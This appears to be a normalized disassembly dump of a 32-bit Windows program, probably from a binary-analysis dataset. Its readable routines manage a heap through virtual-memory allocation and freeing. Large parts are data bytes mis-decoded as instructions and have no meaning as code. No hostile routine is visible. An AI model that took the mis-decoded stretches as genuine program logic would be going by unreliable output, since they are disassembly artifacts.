sub_401092
call [ eax + r-xdata ]
or al [ esi ]
push ebx
je r-xdata
arpl [ esp + edi * 8 + 0x10 ] si
imul ebp [ esi + 0x67 ] r-xdata
or al 0x7
push esi
popad
jb r-xdata
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
popad
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah al
pop ecx
inc eax
add al dl
pop ecx
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add al ah
pop ecx
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x11004032 ] ah
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
insd
add [ eax ] al
sub [ ecx ] dl
inc eax
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
je r-xdata
nop
inc eax
adc [ eax ] al
add [ edi ] eax
dec ecx
outsb
je r-xdata
inc eax
add ah bh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
sar bh 0x25
jb r-xdata
inc esi
jne r-xdata
jb r-xdata
outsb
je r-xdata
jb r-xdata
push ebx
jns r-xdata
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
inc eax
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
or [ edx ] dl
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
je sub_401274
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
pop eax
adc [ eax ] al
add [ edx + eax * 2 ] eax
jns r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0xe025ff01
int1
dec eax
add [ ebx - 0x23da0040 ] cl
int1
dec eax
add [ ebx - 0x27da0040 ] cl
int1
dec eax
add [ ebx - 0x2bda0040 ] cl
int1
dec eax
add [ ebx - 0x2fda0040 ] cl
int1
dec eax
add [ ebx - 0xbda0040 ] cl
int1
dec eax
add [ ebx - 0x33da0040 ] cl
int1
dec eax
add [ ebx - 0x37da0040 ] cl
int1
dec eax
add [ ebx - 0x3bda0040 ] cl
int1
dec eax
add [ ebx - 0xfda0040 ] cl
int1
dec eax
add [ ebx - 0x3fda0040 ] cl
int1
dec eax
add [ ebx - 0x43da0040 ] cl
int1
dec eax
add [ ebx - 0x47da0040 ] cl
int1
dec eax
add [ ebx - 0x4bda0040 ] cl
int1
dec eax
add [ ebx - 0x4fda0040 ] cl
int1
dec eax
add [ ebx - 0x53da0040 ] cl
int1
dec eax
add [ ebx - 0x57da0040 ] cl
int1
dec eax
add [ ebx - 0x5bda0040 ] cl
int1
dec eax
add [ ebx - 0x5fda0040 ] cl
int1
dec eax
add [ ebx - 0x63da0040 ] cl
int1
dec eax
add [ ebx - 0x67da0040 ] cl
int1
dec eax
add [ ebx - 0x13da0040 ] cl
int1
dec eax
add [ ebx - 0x6bda0040 ] cl
int1
dec eax
add [ ebx - 0x6fda0040 ] cl
int1
dec eax
add [ ebx - 0x73da0040 ] cl
int1
dec eax
add [ ebx + 0x425ffc0 ] cl
dec eax
add [ ebx + 0x25ffc0 ] cl
dec eax
add [ ebx - 0x3da0040 ] cl
int1
dec eax
add [ ebx - 0x77da0040 ] cl
int1
dec eax
add [ ebx - 0x7bda0040 ] cl
int1
dec eax
add [ ebx + 0x1425ffc0 ] cl
dec eax
add [ ebx + 0x1025ffc0 ] cl
dec eax
add [ ebx + 0xc25ffc0 ] cl
dec eax
add [ ebx - 0x7fda0040 ] cl
int1
dec eax
add [ ebx + 0x7c25ffc0 ] cl
int1
dec eax
add [ ebx + 0x7825ffc0 ] cl
int1
dec eax
add [ ebx + 0x7425ffc0 ] cl
int1
dec eax
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
add [ eax ] al
add [ eax ] al
[ eax ] eax
je r-xdata
adc [ eax ] al
add al 0x0
add [ gs : eax ] eax
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add [ edi + edx * 2 ] eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add eax [ eax ]
add [ eax ] al
add bh bh
inc [ eax ]
add [ eax + r-xdata ] dl
add [ eax ] ecx
inc ebx
popad
jb r-xdata
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x7004032 ] ah
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
inc eax
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
sub_401153
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403364
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401175
push ebp
adc [ eax ] eax
pop edi
adc [ eax ] eax
imul edx [ ecx ] 0x10040
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
jne r-xdata
adc [ ecx ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
[ eax ] eax
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add al ah
xor al 0x40
add ah al
pop ecx
inc eax
add al dl
pop ecx
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add al ah
pop ecx
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x11004032 ] ah
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x11f00040 ] cl
inc eax
add [ ecx + 0x4011 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc [ eax ] eax
sar bh 0x25
jb r-xdata
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
or [ edx ] dl
inc eax
add [ ecx + ecx ] al
push esp
inc esp
popad
je sub_401274
push esp
imul ebp [ ebp + 0x65 ] 0xe025ff01
int1
dec eax
add [ ebx - 0x23da0040 ] cl
int1
dec eax
add [ ebx - 0x27da0040 ] cl
int1
dec eax
add [ ebx - 0x2bda0040 ] cl
int1
dec eax
add [ ebx - 0x2fda0040 ] cl
int1
dec eax
add [ ebx - 0xbda0040 ] cl
int1
dec eax
add [ ebx - 0x33da0040 ] cl
int1
dec eax
add [ ebx - 0x37da0040 ] cl
int1
dec eax
add [ ebx - 0x3bda0040 ] cl
int1
dec eax
add [ ebx - 0xfda0040 ] cl
int1
dec eax
add [ ebx - 0x3fda0040 ] cl
int1
dec eax
add [ ebx - 0x43da0040 ] cl
int1
dec eax
add [ ebx - 0x47da0040 ] cl
int1
dec eax
add [ ebx - 0x4bda0040 ] cl
int1
dec eax
add [ ebx - 0x4fda0040 ] cl
int1
dec eax
add [ ebx - 0x53da0040 ] cl
int1
dec eax
add [ ebx - 0x57da0040 ] cl
int1
dec eax
add [ ebx - 0x5bda0040 ] cl
int1
dec eax
add [ ebx - 0x5fda0040 ] cl
int1
dec eax
add [ ebx - 0x63da0040 ] cl
int1
dec eax
add [ ebx - 0x67da0040 ] cl
int1
dec eax
add [ ebx - 0x13da0040 ] cl
int1
dec eax
add [ ebx - 0x6bda0040 ] cl
int1
dec eax
add [ ebx - 0x6fda0040 ] cl
int1
dec eax
add [ ebx - 0x73da0040 ] cl
int1
dec eax
add [ ebx + 0x425ffc0 ] cl
dec eax
add [ ebx + 0x25ffc0 ] cl
dec eax
add [ ebx - 0x3da0040 ] cl
int1
dec eax
add [ ebx - 0x77da0040 ] cl
int1
dec eax
add [ ebx - 0x7bda0040 ] cl
int1
dec eax
add [ ebx + 0x1425ffc0 ] cl
dec eax
add [ ebx + 0x1025ffc0 ] cl
dec eax
add [ ebx + 0xc25ffc0 ] cl
dec eax
add [ ebx - 0x7fda0040 ] cl
int1
dec eax
add [ ebx + 0x7c25ffc0 ] cl
int1
dec eax
add [ ebx + 0x7825ffc0 ] cl
int1
dec eax
add [ ebx + 0x7425ffc0 ] cl
int1
dec eax
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
sub_4013a0
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401360
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013f8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4013a0
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401440
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_401428
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_401428
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013f8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_4014b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013f8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_401428
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401544
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013f8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401370
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401378
xor eax eax
mov [ ebx ] eax
sub_4015a8
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401370
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401370
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013f8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401378
xor eax eax
mov [ ebx ] eax
sub_401620
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401378
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_401428
mov [ rw-data ] 0x1
sub_4016d8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401370
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40176c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401378
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401544
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016d8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401440
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401620
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_401428
jmp r-xdata
sub_40187c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_4015a8
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401440
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_4015a8
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401620
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401440
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016d8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401620
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_401428
jmp r-xdata
sub_4019a0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40176c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401440
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401620
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_4014b0
jmp r-xdata
sub_401a2c
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ae2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401380
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013f0
mov eax rw-data
call sub_4013f0
mov eax rw-data
call sub_4013f0
push 0xff8
push 0x0
call sub_401360
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401388
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ae9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401390
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401af0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401bc6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401388
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401378
mov ebx [ ebx ]
mov eax rw-data
call sub_4013f0
mov eax rw-data
call sub_4013f0
mov eax rw-data
call sub_4013f0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401398
retn
push rw-data
call sub_401390
sub_401bd0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c34
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c64
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e38
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401cb8
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c94
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401ce0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401bd0
add ebx esi
mov [ rw-data ] 0x6
sub_401d50
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401bd0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c34
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_4019a0
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_4019a0
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c64
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_4014b0
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401cb8
sub_401e38
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d88
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401ec0
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c94
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401f0c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
